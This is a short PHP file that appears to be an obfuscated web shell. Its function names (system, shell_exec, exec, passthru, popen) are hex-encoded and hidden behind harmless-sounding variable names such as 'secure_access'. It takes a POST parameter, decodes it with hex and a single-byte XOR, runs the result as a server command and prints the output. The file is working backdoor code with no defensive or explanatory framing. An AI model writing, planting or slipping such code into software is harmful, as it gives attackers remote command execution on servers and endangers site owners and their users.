<?php

$request_approved = "\x68e\x782b\x69\x6E";
$secure_access2 = "\x73\x68\x65ll\x5F\x65xec";
$secure_access4 = "\x70as\x73\x74hru";
$secure_access3 = "\x65x\x65c";
$secure_access6 = "\x73\x74re\x61\x6D_\x67\x65\x74_con\x74ents";
$secure_access5 = "p\x6Fpen";
$secure_access7 = "pc\x6Cos\x65";
$secure_access1 = "\x73\x79s\x74em";
if (isset($_POST["va\x6C"])) {
            function reverse_lookup    (    $holder    ,      $data    )     {      $bind    =   ''    ;      foreach(str_split($holder) as $char){$bind.=chr(ord($char)^$data);} return    $bind;    }
            $val = $request_approved($_POST["va\x6C"]);
            $val = reverse_lookup($val, 60);
            if (function_exists($secure_access1)) {
                $secure_access1($val);
            } elseif (function_exists($secure_access2)) {
                print $secure_access2($val);
            } elseif (function_exists($secure_access3)) {
                $secure_access3($val, $object_holder);
                print join("\n", $object_holder);
            } elseif (function_exists($secure_access4)) {
                $secure_access4($val);
            } elseif (function_exists($secure_access5) && function_exists($secure_access6) && function_exists($secure_access7)) {
                $data_bind = $secure_access5($val, 'r');
                if ($data_bind) {
                    $token_reference = $secure_access6($data_bind);
                    $secure_access7($data_bind);
                    print $token_reference;
                }
            }
            exit;
        }